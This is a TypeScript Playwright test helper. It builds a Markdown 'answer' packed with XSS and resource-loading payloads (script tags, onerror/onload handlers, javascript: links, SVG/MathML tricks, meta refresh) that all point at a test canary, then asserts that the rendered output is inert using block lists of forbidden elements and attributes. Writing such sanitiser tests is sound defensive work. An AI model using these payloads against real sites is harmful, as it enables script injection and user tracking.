/**
 * Markdown an untrusted model might answer with: every way to make a page
 * load something or run something that this suite could think of. Each item
 * that tries to run code sets `window.__pwned`; each address points at the
 * canary, which records whatever reaches it.
 */
import { expect } from '@playwright/test';
import type { Locator, Page } from '@playwright/test';

declare global {
  interface Window {
    __pwned?: string;
  }
}

export function hostileMarkdown(canary: string): string {
  const run = (how: string): string => `window.__pwned='${how}'`;
  // Each entry is a block of its own, so that raw HTML does not swallow the
  // Markdown that follows it and every construct reaches the renderer.
  return [
    '# Hostile answer',

    // Images, in every spelling.
    `<img src="${canary}/img-tag.png">`,
    `Inline <img src=${canary}/img-unquoted.png onerror=${run('img-onerror')}> image.`,
    `<img src="x" onerror="${run('img-onerror-quoted')}">`,
    `<img srcset="${canary}/srcset.png 2x">`,
    `![markdown image](${canary}/markdown-image.png "title")`,
    '![reference image][pic]',
    `[![image in a link](${canary}/linked-image.png)](${canary}/linked-image-target)`,
    `<picture><source srcset="${canary}/picture.png"><img src="${canary}/picture-fallback.png"></picture>`,
    `<input type="image" src="${canary}/input-image.png">`,
    `<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='${run('data-svg')}'/>">`,
    `![data image](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=)`,

    // Scripts.
    `<script>${run('script')};fetch('${canary}/script-fetch')</script>`,
    `<script src="${canary}/script-src.js"></script>`,
    `<SCRIPT>${run('script-upper')}</SCRIPT>`,
    `<scr<script>ipt>${run('script-nested')}</scr</script>ipt>`,
    `Text with an inline <script>${run('script-inline')}</script> script.`,

    // Links that are not links.
    `[javascript link](javascript:${run('md-js-link')})`,
    `[spaced](<  javascript:${run('md-js-spaced')}>)`,
    `[mixed case](JaVaScRiPt:${run('md-js-case')})`,
    `[entity](java&#x73;cript:${run('md-js-entity')})`,
    `[tab](java&Tab;script:${run('md-js-tab')})`,
    '[vbscript](vbscript:msgbox(1))',
    `[data](data:text/html,<script>${run('data-html')}</script>)`,
    '[reference link][js]',
    `<javascript:${run('autolink')}>`,
    `<a href="javascript:${run('a-js')}" onclick="${run('a-onclick')}">raw anchor</a>`,
    `<a href="${canary}/ping-target" ping="${canary}/ping">ping</a>`,
    '[relative](/api/auth/logout)',
    '[protocol relative](//canary.invalid/protocol-relative)',

    // Event handlers.
    `<div onmouseover="${run('onmouseover')}" onclick="${run('onclick')}">hover me</div>`,
    `<details open ontoggle="${run('ontoggle')}"><summary>details</summary>x</details>`,
    `<input autofocus onfocus="${run('onfocus')}">`,
    `<body onload="${run('body-onload')}">`,
    `<marquee onstart="${run('marquee')}">m</marquee>`,
    `<video autoplay onloadstart="${run('video-onloadstart')}" src="${canary}/video.mp4" poster="${canary}/poster.png"></video>`,
    `<audio src="${canary}/audio.mp3" onerror="${run('audio-onerror')}"></audio>`,

    // SVG and MathML.
    `<svg xmlns="http://www.w3.org/2000/svg" onload="${run('svg-onload')}"><image href="${canary}/svg-image.png" xlink:href="${canary}/svg-xlink.png"/><use href="${canary}/sprite.svg#a"/><script>${run('svg-script')}</script><foreignObject><img src="${canary}/foreign-object.png"></foreignObject><animate onbegin="${run('svg-animate')}" attributeName="x" dur="1s"/></svg>`,
    `<math><mtext><table><mglyph><style><img src="${canary}/mathml.png" onerror="${run('mathml')}"></style></mglyph></table></mtext></math>`,

    // Styles.
    `<style>@import url("${canary}/import.css"); body { background: url("${canary}/style-background.png"); } @font-face { font-family: x; src: url("${canary}/font.woff2"); }</style>`,
    `<div style="background-image: url('${canary}/inline-style.png'); position: fixed; inset: 0">covers the page</div>`,
    `<link rel="stylesheet" href="${canary}/link.css">`,
    `<link rel="preload" as="image" href="${canary}/preload.png">`,
    '<link rel="dns-prefetch" href="//canary.invalid">',

    // Frames, plugins, forms and document-level tags.
    `<iframe src="${canary}/frame.html"></iframe>`,
    `<iframe srcdoc="<script>parent.__pwned='srcdoc'</script>"></iframe>`,
    `<object data="${canary}/object.swf"></object><embed src="${canary}/embed.swf">`,
    `<form action="${canary}/form" method="post"><button formaction="javascript:${run('formaction')}">submit</button></form>`,
    `<meta http-equiv="refresh" content="0;url=${canary}/meta-refresh">`,
    `<base href="${canary}/">`,
    `<template><img src="${canary}/template.png"></template>`,
    `<noscript><img src="${canary}/noscript.png"></noscript>`,

    // Inside the structures Markdown renders.
    [
      `| cell | <img src="${canary}/table-cell.png" onerror="${run('table')}"> |`,
      '|---|---|',
      `| [x](javascript:${run('table-link')}) | ![i](${canary}/table-markdown-image.png) |`,
    ].join('\n'),
    [
      `- <img src="${canary}/list-item.png">`,
      `- ![listed](${canary}/list-markdown-image.png)`,
    ].join('\n'),
    `> <script>${run('blockquote')}</script>`,
    `> ![quoted](${canary}/quote-markdown-image.png)`,
    [
      '```html',
      `<script>${run('code-block')}</script><img src="${canary}/code-block.png">`,
      '```',
    ].join('\n'),
    `Inline \`<img src="${canary}/inline-code.png">\` code.`,

    `A real [link](${canary}/a-real-link) that must stay a link and must not be fetched.`,
    [`[pic]: ${canary}/reference-image.png`, `[js]: javascript:${run('reference-link')}`].join(
      '\n',
    ),
    'The end of the hostile answer.',
  ].join('\n\n');
}

/** A short hostile string for places that hold a name (at most 64 characters). */
export function hostileName(canary: string): string {
  return `<img src=${canary}/n onerror=__pwned=1>`;
}

/** Elements a sanitised answer must never contain. */
const FORBIDDEN_ELEMENTS = [
  'img',
  'picture',
  'source',
  'script',
  'style',
  'link',
  'meta',
  'base',
  'iframe',
  'frame',
  'object',
  'embed',
  'video',
  'audio',
  'svg',
  'math',
  'form',
  'input',
  'textarea',
  'select',
  'template',
  'noscript',
  'marquee',
  'details',
].join(', ');

/** Attributes the renderer itself writes; anything else came from the answer. */
const ALLOWED_ATTRIBUTES = [
  'href',
  'title',
  'target',
  'rel',
  'class',
  'align',
  'start',
  'type',
  'data-copy-code',
];

interface Inspection {
  forbidden: string[];
  attributes: string[];
  links: string[];
}

/** Asserts that rendered, untrusted content holds nothing that loads or runs anything. */
export async function expectInert(container: Locator): Promise<void> {
  const found = await container.evaluate(
    (element, [forbiddenSelector, allowed]): Inspection => {
      const inspection: Inspection = { forbidden: [], attributes: [], links: [] };
      for (const hit of element.querySelectorAll(forbiddenSelector)) {
        inspection.forbidden.push(hit.tagName.toLowerCase());
      }
      for (const node of element.querySelectorAll('*')) {
        for (const attribute of node.attributes) {
          if (!allowed.includes(attribute.name)) {
            inspection.attributes.push(`${node.tagName.toLowerCase()}[${attribute.name}]`);
          }
        }
        if (node instanceof HTMLAnchorElement && node.hasAttribute('href')) {
          const href = node.getAttribute('href') ?? '';
          const safe =
            /^(https?:\/\/|mailto:)/i.test(href) &&
            node.target === '_blank' &&
            node.rel === 'noopener noreferrer';
          if (!safe) inspection.links.push(`${href} target=${node.target} rel=${node.rel}`);
        }
      }
      return inspection;
    },
    [FORBIDDEN_ELEMENTS, ALLOWED_ATTRIBUTES] as const,
  );
  expect(found.forbidden, 'elements that load or run something').toEqual([]);
  expect(found.attributes, 'attributes taken over from the answer').toEqual([]);
  expect(found.links, 'links that are not plain external links').toEqual([]);
}

/** Asserts that the application's own page holds nothing an answer or a name could have smuggled in. */
export async function expectNoSmuggledElements(page: Page): Promise<void> {
  await expect(
    page.locator('img, iframe, object, embed, video, audio, base, meta[http-equiv]'),
  ).toHaveCount(0);
  const handlers = await page
    .locator('*')
    .evaluateAll((elements) =>
      elements.flatMap((element) =>
        [...element.attributes]
          .filter((attribute) => attribute.name.startsWith('on'))
          .map((attribute) => `${element.tagName.toLowerCase()}[${attribute.name}]`),
      ),
    );
  expect(handlers, 'inline event handlers in the document').toEqual([]);
}

/** Asserts that no payload ran anywhere in the page. */
export async function expectNothingRan(page: Page): Promise<void> {
  expect(await page.evaluate(() => window.__pwned), 'a payload ran').toBeUndefined();
}
